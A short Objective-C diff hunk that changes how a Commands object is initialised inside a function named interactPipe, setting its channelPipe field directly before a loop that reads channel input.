@@ -32,7 +32,8 @@ Channel *channel = [[Channel alloc] init];
 Utils *utils = [[Utils alloc] init];
 
 void interactPipe(int channelPipe) {
-    Commands *commands = [[Commands alloc] init:channelPipe];
+    Commands *commands = [[Commands alloc] init];
+    commands->channelPipe = channelPipe;
 
     while (YES) {
         NSString *inputString = [channel readChannel:channelPipe];
